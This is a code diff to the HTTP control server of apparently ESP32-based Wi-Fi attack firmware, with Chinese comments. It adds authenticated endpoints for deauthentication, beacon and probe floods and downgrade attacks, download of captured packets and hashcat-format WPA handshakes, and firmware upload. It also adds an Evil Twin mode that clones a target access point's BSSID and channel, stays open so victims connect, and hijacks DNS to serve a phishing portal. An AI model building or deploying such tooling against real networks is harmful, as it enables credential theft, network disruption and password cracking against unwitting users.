@@ -1,5 +1,5 @@
 /*
- * http_server.c — HTTP REST API 远程控制 + SoftAP 接入点实现
+ * http_server.c: HTTP REST API 远程控制 + SoftAP 接入点实现
  *
  * 设计要点:
  *   1. 模式切换: 启动时 STA -> APSTA (保持 STA 能嗅探/注入, 同时 AP 给人连)
@@ -13,6 +13,16 @@
 #include "wifi_db.h"
 #include "radio_common.h"
 #include "rgb_led.h"
+#include "config.h"       /* 读取 api_token / 保存 ap_password */
+#include "esp_random.h"   /* 随机 AP 密码 */
+#include "phish.h"
+#include "cap.h"
+#include "hs.h"
+#include "ota.h"          /* HTTP 上传升级 */
+#include "event_bus.h"   /* 事件拉取 */
+
+#include "esp_ota_ops.h"
+#include "esp_app_desc.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -34,14 +44,12 @@
 
 static const char *TAG = "HTTP";
 
-/* ======== 状态 ======== */
 static httpd_handle_t s_server = NULL;
 static esp_netif_t   *s_ap_netif = NULL;
 static bool           s_running = false;
 static char           s_ssid[33] = {0};
 static uint16_t       s_sta_num = 0;
 
-/* ======== SoftAP 事件回调 ======== */
 static void ap_event_handler(void *arg, esp_event_base_t event_base,
                               int32_t event_id, void *event_data)
 {
@@ -59,7 +67,6 @@ static void ap_event_handler(void *arg, esp_event_base_t event_base,
     }
 }
 
-/* ======== JSON 辅助 ======== */
 static void send_json(httpd_req_t *r, const char *fmt, ...)
 {
     char buf[2048];
@@ -84,6 +91,32 @@ static void send_ok(httpd_req_t *r, const char *extra_json)
 static void send_err(httpd_req_t *r, const char *msg)
 {
     send_json(r, "{\"ok\":false,\"err\":\"%s\"}", msg);
+}
+
+/* 危险操作鉴权. 检查 Authorization: Bearer <token> 头或 ?token= 查询参数.
+ * 通过返回 true; 失败回 403 并返回 false. */
+static bool require_token(httpd_req_t *r)
+{
+    const char *token = config_get("api_token");
+    if (!token) { send_err(r, "no_token_configured"); return false; }
+
+    char hdr[64] = {0};
+    if (httpd_req_get_hdr_value_str(r, "Authorization", hdr, sizeof(hdr)) == ESP_OK) {
+        /* 形如 "Bearer xxxx" */
+        const char *p = strstr(hdr, "Bearer ");
+        if (p && strcmp(p + 7, token) == 0) return true;
+    }
+    /* 查询参数兜底 (方便 curl 测试) */
+    char q[128] = {0};
+    if (httpd_req_get_url_query_str(r, q, sizeof(q)) == ESP_OK) {
+        char val[64] = {0};
+        if (httpd_query_key_value(q, "token", val, sizeof(val)) == ESP_OK) {
+            if (strcmp(val, token) == 0) return true;
+        }
+    }
+    httpd_resp_set_status(r, "403 Forbidden");
+    send_err(r, "auth_required");
+    return false;
 }
 
 /* 极简 JSON 取值: 在 body 中查 "key":value, 返回字符串指针 (需后续解析) */
@@ -144,10 +177,13 @@ static char *read_body(httpd_req_t *r)
 }
 
 
-/* ======== REST Handlers ======== */
+/* REST Handlers */
 
 static esp_err_t h_root_get(httpd_req_t *r)
 {
+    /* 钓鱼门户开启时, 根路径直接渲染门户页 (否则访问网关会看到控制台页面) */
+    if (phish_serve_portal_page(r)) return ESP_OK;
+
     httpd_resp_set_type(r, "text/html; charset=ascii");
     httpd_resp_sendstr_chunk(r,
         "<!DOCTYPE html><html><head><meta charset='ascii'>"
@@ -301,7 +337,8 @@ static esp_err_t h_sniff_auto_post(httpd_req_t *r)
     json_get_int(body, "dwell_ms", &dwell);
     free(body);
     if (dwell < 100) dwell = 100;
-    esp_err_t e = wifi_attack_sniff_auto_start((uint32_t)dwell);
+    /* 排徖嗅探按时间走, 不设包数上限 -> count=0 表示永续 */
+    esp_err_t e = wifi_attack_sniff_auto_start((uint32_t)dwell, 0);
     if (e != ESP_OK) { send_err(r, "sniff_auto_start_failed"); } else { send_ok(r, NULL); }
     return ESP_OK;
 }
@@ -319,6 +356,7 @@ static esp_err_t h_stop_post(httpd_req_t *r)
 /* POST /api/downgrade/start */
 static esp_err_t h_downgrade_start_post(httpd_req_t *r)
 {
+    if (!require_token(r)) return ESP_OK;
     char *body = read_body(r);
     if (!body) { send_err(r, "oom"); return ESP_OK; }
     char ssid[64] = {0};
@@ -335,6 +373,7 @@ static esp_err_t h_downgrade_start_post(httpd_req_t *r)
 /* POST /api/deauth/start */
 static esp_err_t h_deauth_start_post(httpd_req_t *r)
 {
+    if (!require_token(r)) return ESP_OK;
     char *body = read_body(r);
     if (!body) { send_err(r, "oom"); return ESP_OK; }
     char bssid[64] = {0}, sta[64] = {0};
@@ -360,18 +399,21 @@ static esp_err_t h_deauth_start_post(httpd_req_t *r)
 /* POST /api/beaconflood/start */
 static esp_err_t h_beacon_start_post(httpd_req_t *r)
 {
+    if (!require_token(r)) return ESP_OK;
     char *body = read_body(r);
     if (!body) { send_err(r, "oom"); return ESP_OK; }
     char prefix[128] = {0};
-    int count = 0, interval = 0;
+    int count = 0, interval = 0, channel = 0;
     bool ok = json_get_str(body, "prefix", prefix, sizeof(prefix));
     json_get_int(body, "count", &count);
     json_get_int(body, "interval_ms", &interval);
+    json_get_int(body, "channel", &channel);
     free(body);
     if (!ok || !prefix[0]) { send_err(r, "missing_prefix"); return ESP_OK; }
     esp_err_t e = wifi_attack_beacon_flood_start(prefix,
         count < 0 ? 0 : (uint32_t)count,
-        interval < 0 ? 0 : (uint32_t)interval);
+        interval < 0 ? 0 : (uint32_t)interval,
+        channel < 0 || channel > 255 ? 0 : (uint8_t)channel);
     if (e != ESP_OK) { send_err(r, "beacon_start_failed"); } else { send_ok(r, NULL); }
     return ESP_OK;
 }
@@ -379,6 +421,7 @@ static esp_err_t h_beacon_start_post(httpd_req_t *r)
 /* POST /api/probeflood/start */
 static esp_err_t h_probe_start_post(httpd_req_t *r)
 {
+    if (!require_token(r)) return ESP_OK;
     char *body = read_body(r);
     if (!body) { send_err(r, "oom"); return ESP_OK; }
     int count = 0, interval = 0;
@@ -393,7 +436,7 @@ static esp_err_t h_probe_start_post(httpd_req_t *r)
 }
 
 
-/* ======== DB export handlers ======== */
+/* DB export handlers */
 
 /* GET /api/db/aps */
 static esp_err_t h_db_aps_get(httpd_req_t *r)
@@ -549,7 +592,251 @@ static esp_err_t h_export_csv(httpd_req_t *r)
 }
 
 
-/* ======== URI 注册 ======== */
+/* 原始帧落盘 (cap)
+ * 完整 pcap 走这里回传: 手机连上板子的热点后直接 GET /api/cap/pcap,
+ * 7MB 也能一次拉完 (BLE 那条路只适合拉关键帧). */
+
+static esp_err_t h_cap_info_get(httpd_req_t *r)
+{
+    char body[256];
+    int n = snprintf(body, sizeof(body),
+        "{\"on\":%s,\"keyonly\":%s,\"frames\":%u,\"drops\":%u,"
+        "\"bytes\":%u,\"capacity\":%u,\"keys\":%u,\"full\":%s}",
+        cap_is_on() ? "true" : "false", cap_key_only() ? "true" : "false",
+        (unsigned)cap_frames(), (unsigned)cap_drops(),
+        (unsigned)cap_pcap_size(), (unsigned)cap_capacity(),
+        (unsigned)cap_key_count(), cap_is_full() ? "true" : "false");
+    httpd_resp_set_type(r, "application/json");
+    httpd_resp_set_hdr(r, "Access-Control-Allow-Origin", "*");
+    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
+    return httpd_resp_send(r, body, n);
+}
+
+static esp_err_t h_cap_keys_get(httpd_req_t *r)
+{
+    char chunk[192];
+    httpd_resp_set_type(r, "application/json");
+    httpd_resp_set_hdr(r, "Access-Control-Allow-Origin", "*");
+    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
+
+    uint32_t n = cap_key_count();
+    int pos = snprintf(chunk, sizeof(chunk), "{\"count\":%u,\"keys\":[", (unsigned)n);
+    httpd_resp_send_chunk(r, chunk, pos);
+
+    for (uint32_t i = 0; i < n; i++) {
+        uint8_t kind = 0, chan = 0; uint32_t off = 0, len = 0, ts = 0; int8_t rssi = 0;
+        if (cap_key_get(i, &kind, &off, &len, &ts, &chan, &rssi) != 0) continue;
+        pos = snprintf(chunk, sizeof(chunk),
+                       "%s{\"i\":%u,\"kind\":%u,\"off\":%u,\"len\":%u,\"ts\":%u,\"chan\":%u,\"rssi\":%d}",
+                       i ? "," : "", (unsigned)i, (unsigned)kind,
+                       (unsigned)off, (unsigned)len, (unsigned)ts,
+                       (unsigned)chan, (int)rssi);
+        httpd_resp_send_chunk(r, chunk, pos);
+    }
+    httpd_resp_send_chunk(r, "]}", 2);
+    httpd_resp_send_chunk(r, NULL, 0);
+    return ESP_OK;
+}
+
+static esp_err_t h_cap_pcap_get(httpd_req_t *r)
+{
+    uint32_t size = cap_pcap_size();
+    uint32_t off = 0, len = size;
+
+    char q[80];
+    if (httpd_req_get_url_query_str(r, q, sizeof(q)) == ESP_OK) {
+        char v[16];
+        if (httpd_query_key_value(q, "off", v, sizeof(v)) == ESP_OK) {
+            off = (uint32_t)strtoul(v, NULL, 0);
+        }
+        if (httpd_query_key_value(q, "len", v, sizeof(v)) == ESP_OK) {
+            len = (uint32_t)strtoul(v, NULL, 0);
+        }
+    }
+    if (off >= size) { len = 0; }
+    else if (off + len > size) { len = size - off; }
+
+    httpd_resp_set_type(r, "application/vnd.tcpdump.pcap");
+    httpd_resp_set_hdr(r, "Access-Control-Allow-Origin", "*");
+    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
+    httpd_resp_set_hdr(r, "Content-Disposition", "attachment; filename=rftool-capture.pcap");
+
+    /* httpd 是单任务 select 模型, 用静态缓冲避免占用它的栈 */
+    static uint8_t s_chunk[4096];
+    uint32_t pos = off, end = off + len;
+    while (pos < end) {
+        uint32_t want = end - pos;
+        if (want > sizeof(s_chunk)) want = sizeof(s_chunk);
+        int got = cap_read(pos, s_chunk, want);
+        if (got <= 0) break;
+        if (httpd_resp_send_chunk(r, (const char *)s_chunk, got) != ESP_OK) break;
+        pos += (uint32_t)got;
+    }
+    httpd_resp_send_chunk(r, NULL, 0);
+    return ESP_OK;
+}
+
+
+/* EAPOL 握手 / hashcat 22000 */
+
+static esp_err_t h_hs_get(httpd_req_t *r)
+{
+    char body[160];
+    int n = snprintf(body, sizeof(body), "{\"total\":%d,\"complete\":%d}",
+                     hs_count(), hs_complete_count());
+    httpd_resp_set_type(r, "application/json");
+    httpd_resp_set_hdr(r, "Access-Control-Allow-Origin", "*");
+    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
+    return httpd_resp_send(r, body, n);
+}
+
+/* 逐行直发, 不在 httpd 任务栈上再开一个大缓冲 */
+static void hs_22000_sink(const char *line, void *ctx)
+{
+    httpd_req_t *r = (httpd_req_t *)ctx;
+    httpd_resp_send_chunk(r, line, (ssize_t)strlen(line));
+    httpd_resp_send_chunk(r, "\n", 1);
+}
+
+static esp_err_t h_hs_22000_get(httpd_req_t *r)
+{
+    httpd_resp_set_type(r, "text/plain; charset=ascii");
+    httpd_resp_set_hdr(r, "Access-Control-Allow-Origin", "*");
+    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
+    httpd_resp_set_hdr(r, "Content-Disposition", "attachment; filename=rftool.hc22000");
+
+    if (hs_export_22000(hs_22000_sink, r) == 0) {
+        const char *m = "# no usable handshake (need M1+M2 or M2+M3 with equal "
+                        "replay counter, or a PMKID)\n";
+        httpd_resp_send_chunk(r, m, (ssize_t)strlen(m));
+    }
+    httpd_resp_send_chunk(r, NULL, 0);
+    return ESP_OK;
+}
+
+
+/* OTA (HTTP 上传 / 状态) */
+
+/* GET /api/ota/status, 给 App 显示当前槽位与镜像状态, 不需要 token */
+static esp_err_t h_ota_status_get(httpd_req_t *r)
+{
+    const esp_partition_t *run  = esp_ota_get_running_partition();
+    const esp_partition_t *boot = esp_ota_get_boot_partition();
+    esp_ota_img_states_t   st   = ESP_OTA_IMG_UNDEFINED;
+    if (run) esp_ota_get_state_partition(run, &st);
+
+    const char *state = "UNDEFINED";
+    switch (st) {
+    case ESP_OTA_IMG_NEW:            state = "NEW"; break;
+    case ESP_OTA_IMG_PENDING_VERIFY: state = "PENDING_VERIFY"; break;
+    case ESP_OTA_IMG_VALID:          state = "VALID"; break;
+    case ESP_OTA_IMG_INVALID:        state = "INVALID"; break;
+    case ESP_OTA_IMG_ABORTED:        state = "ABORTED"; break;
+    default: break;
+    }
+    const esp_app_desc_t *app = esp_app_get_description();
+
+    send_json(r,
+        "{\"ok\":true,\"running\":\"%s\",\"boot\":\"%s\",\"state\":\"%s\","
+        "\"version\":\"%s\",\"slot_size\":%u,\"busy\":%s,\"written\":%u}",
+        run ? run->label : "?", boot ? boot->label : "?", state,
+        app ? app->version : "?", (unsigned)(run ? run->size : 0),
+        ota_upload_busy() ? "true" : "false", (unsigned)ota_upload_written());
+    return ESP_OK;
+}
+
+/* POST /api/ota?token=<api_token>[&sha256=<64hex>]  body = 完整 app .bin
+ * 流式写入下一个 OTA 分区, 结束后由 esp_ota_end 校验并切换启动分区.
+ * 注意: 这是唯一一个需要 token 的写操作里最敏感的一个, 换成别的固件
+ * 等于接管整机, 所以鉴权失败直接 403, 不带任何降级路径. */
+static esp_err_t h_ota_upload_post(httpd_req_t *r)
+{
+    if (!require_token(r)) return ESP_OK;
+
+    size_t total = r->content_len;
+    if (total < 4096) {
+        send_err(r, "body_too_small");
+        return ESP_OK;
+    }
+
+    /* 可选 SHA-256 固定值: URL 参数优先, 其次请求头 */
+    char sha[80] = {0};
+    char q[160] = {0};
+    if (httpd_req_get_url_query_str(r, q, sizeof(q)) == ESP_OK) {
+        httpd_query_key_value(q, "sha256", sha, sizeof(sha));
+    }
+    if (!sha[0]) {
+        httpd_req_get_hdr_value_str(r, "X-Firmware-Sha256", sha, sizeof(sha));
+    }
+
+    esp_err_t e = ota_upload_begin(total, sha[0] ? sha : NULL);
+    if (e != ESP_OK) {
+        httpd_resp_set_status(r, "409 Conflict");
+        send_err(r, ota_last_error());
+        return ESP_OK;
+    }
+    /* 目标槽位要在切换前记下来: 切换后 get_next_update_partition 会指向旧槽 */
+    const esp_partition_t *target = esp_ota_get_next_update_partition(NULL);
+
+    const size_t CHUNK = 4096;
+    char *buf = malloc(CHUNK);
+    if (!buf) {
+        ota_upload_end(false);
+        httpd_resp_set_status(r, "500 Internal Server Error");
+        send_err(r, "no_mem");
+        return ESP_OK;
+    }
+
+    size_t remaining = total;
+    bool failed = false;
+    while (remaining > 0) {
+        size_t want = remaining > CHUNK ? CHUNK : remaining;
+        int got = httpd_req_recv(r, buf, want);
+        if (got == HTTPD_SOCK_ERR_TIMEOUT) continue;
+        if (got <= 0) { failed = true; break; }
+        if (ota_upload_write(buf, (size_t)got) != ESP_OK) { failed = true; break; }
+        remaining -= (size_t)got;
+    }
+    free(buf);
+
+    if (failed) {
+        ota_upload_end(false);
+        httpd_resp_set_status(r, "400 Bad Request");
+        send_err(r, ota_last_error());
+        return ESP_OK;
+    }
+
+    e = ota_upload_end(true);
+    if (e != ESP_OK) {
+        httpd_resp_set_status(r, "422 Unprocessable Entity");
+        send_err(r, ota_last_error());
+        return ESP_OK;
+    }
+
+    send_json(r, "{\"ok\":true,\"written\":%u,\"slot\":\"%s\","
+                 "\"action\":\"run 'ota reboot' or power-cycle to apply\"}",
+              (unsigned)ota_upload_written(), target ? target->label : "?");
+    return ESP_OK;
+}
+
+static esp_err_t h_events_get(httpd_req_t *r)
+{
+    char q[64] = {0};
+    int n = 10;
+    if (httpd_req_get_url_query_str(r, q, sizeof(q)) == ESP_OK) {
+        char v[16] = {0};
+        if (httpd_query_key_value(q, "n", v, sizeof(v)) == ESP_OK) n = atoi(v);
+    }
+    char *buf = malloc(3072);
+    if (!buf) { send_err(r, "no_mem"); return ESP_OK; }
+    event_snapshot_json(buf, 3072, n);
+    httpd_resp_set_type(r, "application/json");
+    httpd_resp_set_hdr(r, "Access-Control-Allow-Origin", "*");
+    httpd_resp_send(r, buf, HTTPD_RESP_USE_STRLEN);
+    free(buf);
+    return ESP_OK;
+}
+
 
 static const httpd_uri_t s_uri_root =       { .uri = "/",                  .method = HTTP_GET,  .handler = h_root_get };
 static const httpd_uri_t s_uri_status =     { .uri = "/api/status",        .method = HTTP_GET,  .handler = h_status_get };
@@ -565,6 +852,15 @@ static const httpd_uri_t s_uri_db_clients = { .uri = "/api/db/clients",    .meth
 static const httpd_uri_t s_uri_db_eapols =  { .uri = "/api/db/eapols",     .method = HTTP_GET,  .handler = h_db_eapols_get };
 static const httpd_uri_t s_uri_exp_json =   { .uri = "/api/export/json",   .method = HTTP_GET,  .handler = h_export_json };
 static const httpd_uri_t s_uri_exp_csv  =   { .uri = "/api/export/csv",    .method = HTTP_GET,  .handler = h_export_csv };
+static const httpd_uri_t s_uri_cap_info =   { .uri = "/api/cap/info",      .method = HTTP_GET,  .handler = h_cap_info_get };
+static const httpd_uri_t s_uri_cap_keys =   { .uri = "/api/cap/keys",      .method = HTTP_GET,  .handler = h_cap_keys_get };
+static const httpd_uri_t s_uri_cap_pcap =   { .uri = "/api/cap/pcap",      .method = HTTP_GET,  .handler = h_cap_pcap_get };
+static const httpd_uri_t s_uri_hs       =   { .uri = "/api/hs",           .method = HTTP_GET,  .handler = h_hs_get };
+static const httpd_uri_t s_uri_hs22000  =   { .uri = "/api/hs/22000",     .method = HTTP_GET,  .handler = h_hs_22000_get };
+/* OTA */
+static const httpd_uri_t s_uri_ota_status = { .uri = "/api/ota/status",   .method = HTTP_GET,  .handler = h_ota_status_get };
+static const httpd_uri_t s_uri_ota_upload = { .uri = "/api/ota",          .method = HTTP_POST, .handler = h_ota_upload_post };
+static const httpd_uri_t s_uri_events     = { .uri = "/api/events",       .method = HTTP_GET,  .handler = h_events_get };
 
 static void register_all_uri(httpd_handle_t srv)
 {
@@ -582,11 +878,36 @@ static void register_all_uri(httpd_handle_t srv)
     httpd_register_uri_handler(srv, &s_uri_db_eapols);
     httpd_register_uri_handler(srv, &s_uri_exp_json);
     httpd_register_uri_handler(srv, &s_uri_exp_csv);
+    httpd_register_uri_handler(srv, &s_uri_cap_info);
+    httpd_register_uri_handler(srv, &s_uri_cap_keys);
+    httpd_register_uri_handler(srv, &s_uri_cap_pcap);
+    httpd_register_uri_handler(srv, &s_uri_hs);
+    httpd_register_uri_handler(srv, &s_uri_hs22000);
+    httpd_register_uri_handler(srv, &s_uri_ota_status);
+    httpd_register_uri_handler(srv, &s_uri_ota_upload);
+    httpd_register_uri_handler(srv, &s_uri_events);
 }
 
-/* ======== 公共 API ======== */
 
 bool http_server_is_running(void) { return s_running; }
+
+/* Evil Twin 克隆参数 (只对紧接着的一次 start 生效) */
+static uint8_t s_clone_ch = 0;
+static uint8_t s_clone_mac_buf[6];
+static bool    s_clone_mac_valid = false;
+
+void http_server_set_clone(uint8_t channel, const uint8_t *bssid)
+{
+    s_clone_ch = channel;
+    if (bssid) {
+        memcpy(s_clone_mac_buf, bssid, 6);
+        s_clone_mac_valid = true;
+    } else {
+        s_clone_mac_valid = false;
+    }
+}
+
+const char *http_server_ap_ssid(void) { return s_ssid; }
 
 void http_server_status(void)
 {
@@ -604,11 +925,16 @@ void http_server_status(void)
     fflush(stdout);
 }
 
+httpd_handle_t http_server_handle(void)
+{
+    return s_running ? s_server : NULL;
+}
+
 esp_err_t http_server_start(const char *ssid, const char *pass)
 {
     if (s_running) return ESP_ERR_INVALID_STATE;
 
-    /* --- 1. 切换到 APSTA 模式 (保持 STA 以便嗅探/注入) --- */
+    /* 1. 切换到 APSTA 模式 (保持 STA 以便嗅探/注入) */
     wifi_mode_t cur_mode;
     ESP_RETURN_ON_ERROR(esp_wifi_get_mode(&cur_mode), TAG, "get mode");
     if (cur_mode == WIFI_MODE_STA) {
@@ -617,7 +943,7 @@ esp_err_t http_server_start(const char *ssid, const char *pass)
         ESP_RETURN_ON_ERROR(esp_wifi_set_mode(WIFI_MODE_APSTA), TAG, "force APSTA");
     }
 
-    /* --- 2. 创建 AP netif + 配置静态 IP 192.168.71.1 --- */
+    /* 2. 创建 AP netif + 配置静态 IP 192.168.71.1 */
     if (!s_ap_netif) {
         esp_netif_inherent_config_t netif_cfg = ESP_NETIF_INHERENT_DEFAULT_WIFI_AP();
         s_ap_netif = esp_netif_create_wifi(WIFI_IF_AP, &netif_cfg);
@@ -628,13 +954,28 @@ esp_err_t http_server_start(const char *ssid, const char *pass)
             .netmask = { .addr = ESP_IP4TOADDR(255,255,255,0) },
         };
         esp_netif_set_ip_info(s_ap_netif, &ip);
+        /* 关键: 钓鱼门户的 DNS 劫持要生效, 客户端必须把我们当 DNS.
+         * 先开 OFFER_DNS 开关, 再把本机 IP 填进 DHCP server 的 DNS 字段, * 只开开关不填地址, 下发的会是 0.0.0.0, 客户端拿不到任何 DNS. */
+        {
+            uint8_t offer_dns = 1;
+            esp_err_t de = esp_netif_dhcps_option(s_ap_netif, ESP_NETIF_OP_SET,
+                                                  ESP_NETIF_DOMAIN_NAME_SERVER,
+                                                  &offer_dns, sizeof(offer_dns));
+            if (de != ESP_OK) ESP_LOGW(TAG, "offer dns opt failed: %s", esp_err_to_name(de));
+
+            esp_netif_dns_info_t dns = {0};
+            dns.ip.type = ESP_IPADDR_TYPE_V4;
+            dns.ip.u_addr.ip4.addr = ip.ip.addr;
+            esp_err_t dre = esp_netif_set_dns_info(s_ap_netif, ESP_NETIF_DNS_MAIN, &dns);
+            if (dre != ESP_OK) ESP_LOGW(TAG, "dhcps dns addr failed: %s", esp_err_to_name(dre));
+        }
         esp_netif_dhcps_start(s_ap_netif);
 
         ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
             ESP_EVENT_ANY_ID, &ap_event_handler, NULL, NULL));
     }
 
-    /* --- 3. 配置 SoftAP SSID/密码 --- */
+    /* 3. 配置 SoftAP SSID/密码 */
     if (!ssid || !*ssid) {
         uint8_t mac[6];
         esp_wifi_get_mac(WIFI_IF_AP, mac);
@@ -642,7 +983,6 @@ esp_err_t http_server_start(const char *ssid, const char *pass)
     } else {
         strncpy(s_ssid, ssid, sizeof(s_ssid) - 1);
     }
-    const char *p = (pass && *pass) ? pass : "rftool1234";
     wifi_config_t apcfg = {0};
     {
         size_t n = strlen(s_ssid);
@@ -651,31 +991,66 @@ esp_err_t http_server_start(const char *ssid, const char *pass)
         apcfg.ap.ssid[n] = 0;
     }
     apcfg.ap.ssid_len = strlen((const char *)apcfg.ap.ssid);
-    {
+
+    /* 安全加固 — 未提供密码时, 自动生成随机 WPA2 口令 (防开放 AP 被滥用).
+     * 例外: Evil Twin 克隆 (s_clone_mac_valid) 必须保持 OPEN, 否则受害者
+     * 拿不到口令连不上, 门户攻击失效. */
+    const char *p = (pass && *pass) ? pass : NULL;
+    static char s_genpass[16];
+    if (!p && !s_clone_mac_valid) {
+        static const char alnum[] = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789";
+        for (int i = 0; i < 10; i++) {
+            s_genpass[i] = alnum[esp_random() % (sizeof(alnum) - 1)];
+        }
+        s_genpass[10] = 0;
+        p = s_genpass;
+        config_set("ap_password", s_genpass);
+        ESP_LOGI(TAG, "auto-generated AP password: %s (saved to NVS 'ap_password')", s_genpass);
+    }
+    if (p) {
         size_t n = strlen(p);
         if (n >= sizeof(apcfg.ap.password)) n = sizeof(apcfg.ap.password) - 1;
         memcpy(apcfg.ap.password, p, n);
         apcfg.ap.password[n] = 0;
     }
-    apcfg.ap.channel = 6;
+    apcfg.ap.channel = s_clone_ch ? s_clone_ch : 6;
     apcfg.ap.max_connection = 4;
-    apcfg.ap.authmode = (strlen(p) >= 8) ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN;
+    /* Evil Twin 克隆或显式空口令 = 开放网络; 其余走 WPA2-PSK. */
+    apcfg.ap.authmode = (p && *p) ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN;
+
+    /* Evil Twin: 把 SoftAP 的 MAC 改成目标 AP 的 BSSID.
+     * 必须在 set_config / AP 起来之前设置. 只生效一次. */
+    if (s_clone_mac_valid) {
+        esp_err_t me = esp_wifi_set_mac(WIFI_IF_AP, s_clone_mac_buf);
+        if (me != ESP_OK) ESP_LOGW(TAG, "set ap mac failed: %s", esp_err_to_name(me));
+        else ESP_LOGI(TAG, "cloned BSSID %02x:%02x:%02x:%02x:%02x:%02x",
+                      s_clone_mac_buf[0], s_clone_mac_buf[1], s_clone_mac_buf[2],
+                      s_clone_mac_buf[3], s_clone_mac_buf[4], s_clone_mac_buf[5]);
+        s_clone_mac_valid = false;
+    }
     ESP_RETURN_ON_ERROR(esp_wifi_set_config(WIFI_IF_AP, &apcfg), TAG, "set ap cfg");
+    s_clone_ch = 0;
 
     s_sta_num = 0;
 
-    /* --- 4. 启动 HTTP server --- */
+    /* 4. 启动 HTTP server */
     httpd_config_t hcfg = HTTPD_DEFAULT_CONFIG();
     hcfg.server_port = 80;
     hcfg.max_open_sockets = 7;
     hcfg.lru_purge_enable = true;
     hcfg.stack_size = 6144;
-    hcfg.max_uri_handlers = 16;
+    hcfg.max_uri_handlers = 28;   /* 原 14 + 钓鱼门户 3 + 落盘 3 + 握手 2 */
+    /* 关键: IDF HTTPD_DEFAULT_CONFIG() 把 uri_match_fn 置为 NULL,
+     * 即默认只用精确字符串匹配, 钓鱼门户那条通配 handler 虽注册成功
+     * 却永远匹配不到任何路径 (实测探测路径全 404). 必须显式启用通配匹配. */
+    hcfg.uri_match_fn = httpd_uri_match_wildcard;
     hcfg.task_priority = 23;   /* 关键: 必须高于 inject_task(5) 和 chrot(5),
                                * 与 wifi_task(23) 同级, 确保 /api/stop 能抢占注入任务 */
 
     ESP_RETURN_ON_ERROR(httpd_start(&s_server, &hcfg), TAG, "httpd_start fail");
     register_all_uri(s_server);
+    /* 钓鱼门户若开着, 把它的路由重挂到新实例上 (httpd 重建会让旧 handler 全失效) */
+    phish_on_httpd_ready(s_server);
 
     s_running = true;
     if (rgb_led_get_status() == RGB_IDLE)
